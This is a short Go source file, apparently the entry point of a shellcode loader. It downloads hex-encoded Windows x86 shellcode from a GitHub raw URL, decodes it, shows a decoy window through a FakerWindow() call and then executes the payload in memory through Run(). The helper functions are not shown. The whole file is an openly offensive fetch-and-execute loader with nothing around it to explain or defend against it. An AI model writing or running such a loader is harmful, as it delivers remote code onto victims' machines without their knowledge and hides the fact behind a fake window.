package main

import (
	"encoding/hex"
)


func main() {
//	FakerWindow()
	shellcodeStr := httpDownload("https://raw.githubusercontent.com/pench3r/pench3r.github.io/master/example/windows_x86_shellcode.bin")
	shellcodeByte, _ := hex.DecodeString(shellcodeStr)
	FakerWindow()
	Run(shellcodeByte)
}